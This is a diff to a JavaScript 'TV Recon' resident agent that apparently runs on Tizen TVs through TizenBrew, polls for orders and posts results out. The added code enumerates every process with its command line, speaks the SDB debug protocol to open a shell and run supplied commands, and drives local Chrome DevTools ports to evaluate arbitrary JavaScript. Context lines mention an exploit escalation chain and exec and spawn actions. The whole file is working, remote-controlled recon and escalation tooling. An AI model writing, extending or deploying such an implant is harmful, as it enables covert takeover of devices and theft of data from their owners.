@@ -1,4 +1,4 @@
-/* TV Recon v13 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v14 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -33,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v13 resident agent starting');
-post('v13-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v14 resident agent starting');
+post('v14-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -425,6 +425,156 @@ function doGrepdir(mode) {
     } catch (e) { post('grepdir-err', String(e)); }
 }
 
+function doProcscan(mode) {
+    /* ALL processes, no uid filter */
+    try {
+        var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
+        var procs = [];
+        if (pids instanceof Array) {
+            for (var k = 0; k < pids.length; k++) {
+                var pid = pids[k];
+                var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
+                if (typeof s !== 'string') continue;
+                var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
+                var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
+                if (mode.uid && String(mode.uid) !== uid) continue;
+                var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
+                procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
+                if (procs.length >= 400) break;
+            }
+        }
+        var CH = 30;
+        for (var c = 0; c < procs.length; c += CH) {
+            post('procscan', { chunk: c / CH, total: Math.ceil(procs.length / CH), uid: mode.uid || 'all', list: procs.slice(c, c + CH) });
+        }
+        post('procscan-done', { count: procs.length });
+    } catch (e) { post('procscan-err', String(e)); }
+}
+
+/* ---- minimal SDB (ADB-protocol) client over net ---- */
+function sdbConnect(cb) {
+    var net = require('net');
+    var sock = net.connect(26101, '127.0.0.1');
+    sock.setTimeout(10000);
+    sock.on('error', function (e) { cb('ERR:' + e.message, null); });
+    sock.on('connect', function () {
+        /* CNXN packet: "CNXN" ver maxdata payload */
+        var payload = new Buffer('host::\0', 'ascii');
+        var pkt = new Buffer(24 + payload.length);
+        pkt.write('CNXN', 0, 'ascii');
+        pkt.writeUInt32LE(0x01000000, 4);
+        pkt.writeUInt32LE(4096, 8);
+        pkt.writeUInt32LE(payload.length, 12);
+        pkt.writeUInt32LE(0, 16);
+        pkt.writeUInt32LE(0xFFFFFFFF ^ 0x4E584E43, 20);
+        payload.copy(pkt, 24);
+        sock.write(pkt);
+        /* skip the daemon's CNXN response, then ready */
+        var buf = new Buffer(0);
+        sock.on('data', function first(d) {
+            buf = Buffer.concat([buf, d]);
+            if (buf.length >= 24) {
+                sock.removeListener('data', first);
+                cb(null, sock);
+            }
+        });
+    });
+    return sock;
+}
+
+function sdbShell(cmd, cb) {
+    var sock = sdbConnect(function (err, s) {
+        if (err) { cb(err, ''); return; }
+        var svc = new Buffer('shell:0 ' + cmd + '\0', 'ascii');
+        var open = new Buffer(24 + svc.length);
+        open.write('OPEN', 0, 'ascii');
+        open.writeUInt32LE(1, 4);   /* local id */
+        open.writeUInt32LE(0, 8);
+        open.writeUInt32LE(svc.length, 12);
+        open.writeUInt32LE(0, 16);
+        open.writeUInt32LE(0xFFFFFFFF ^ 0x4E504F, 20);
+        svc.copy(open, 24);
+        s.write(open);
+        var out = '';
+        var done = false;
+        s.on('data', function (d) {
+            /* strip protocol tokens crudely */
+            var t = d.toString('latin1');
+            out += t;
+            if (out.length > 40000 && !done) { done = true; s.destroy(); cb(null, out); }
+        });
+        s.on('close', function () { if (!done) { done = true; cb(null, out); } });
+        s.on('timeout', function () { if (!done) { done = true; s.destroy(); cb(null, out); } });
+    });
+}
+
+function doSdbshell(mode) {
+    try {
+        post('sdbshell-start', { cmd: mode.cmd });
+        sdbShell(mode.cmd, function (err, out) {
+            post('sdbshell-done', { cmd: mode.cmd, err: err ? String(err) : null, out: String(out).slice(0, 20000) });
+        });
+    } catch (e) { post('sdbshell-err', String(e)); }
+}
+
+/* ---- minimal WebSocket client + CDP Runtime.evaluate ---- */
+function doCdp(mode) {
+    try {
+        var crypto = require('crypto');
+        var http = require('http');
+        var key = crypto.randomBytes(16).toString('base64');
+        var path = mode.path || '/';
+        var req = http.request({
+            host: '127.0.0.1', port: mode.port, path: path,
+            headers: {
+                'Connection': 'Upgrade', 'Upgrade': 'websocket',
+                'Sec-WebSocket-Key': key, 'Sec-WebSocket-Version': '13'
+            }
+        });
+        req.on('upgrade', function (res, socket, head) {
+            var sendFrame = function (obj) {
+                var payload = new Buffer(JSON.stringify(obj), 'utf8');
+                var mask = crypto.randomBytes(4);
+                var header;
+                if (payload.length < 126) {
+                    header = new Buffer([0x81, 0x80 | payload.length]);
+                } else {
+                    header = new Buffer(4);
+                    header[0] = 0x81; header[1] = 0x80 | 126;
+                    header.writeUInt16BE(payload.length, 2);
+                }
+                var masked = new Buffer(payload.length);
+                for (var i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i % 4];
+                socket.write(Buffer.concat([header, mask, masked]));
+            };
+            var parseBuf = new Buffer(0);
+            socket.on('data', function (d) {
+                parseBuf = Buffer.concat([parseBuf, d]);
+                while (parseBuf.length >= 2) {
+                    var len = parseBuf[1] & 0x7F;
+                    var off = 2;
+                    if (len === 126) { if (parseBuf.length < 4) return; len = parseBuf.readUInt16BE(2); off = 4; }
+                    else if (len === 127) { if (parseBuf.length < 10) return; len = parseBuf.readUInt32BE(6); off = 10; }
+                    if (parseBuf.length < off + len) return;
+                    var payload = parseBuf.slice(off, off + len);
+                    parseBuf = parseBuf.slice(off + len);
+                    try {
+                        var msg = JSON.parse(payload.toString('utf8'));
+                        if (msg.id === 1) {
+                            post('cdp-result', { port: mode.port, result: JSON.stringify(msg.result || msg.error).slice(0, 8000) });
+                            socket.destroy();
+                        }
+                    } catch (e) {}
+                }
+            });
+            setTimeout(function () { sendFrame({ id: 1, method: 'Runtime.evaluate', params: { expression: mode.js, returnByValue: true } }); }, 300);
+            setTimeout(function () { post('cdp-timeout', { port: mode.port }); try { socket.destroy(); } catch (e) {} }, mode.timeout || 8000);
+        });
+        req.on('error', function (e) { post('cdp-err', { stage: 'http', err: String(e) }); });
+        req.end();
+    } catch (e) { post('cdp-err', { stage: 'outer', err: String(e) }); }
+}
+
 function doExploit(mode) {
     /* Choreographed escalation train, one boot:
      * 1. download N-API addon  2. require() it  3. read constructor marker
@@ -532,6 +682,9 @@ function tick() {
                 else if (mode.action === 'fdscan') doFdscan(mode);
                 else if (mode.action === 'unitmap') doUnitmap(mode);
                 else if (mode.action === 'grepdir') doGrepdir(mode);
+                else if (mode.action === 'procscan') doProcscan(mode);
+                else if (mode.action === 'sdbshell') doSdbshell(mode);
+                else if (mode.action === 'cdp') doCdp(mode);
                 else if (mode.action === 'dlopentest') doDlopentest(mode);
                 else if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
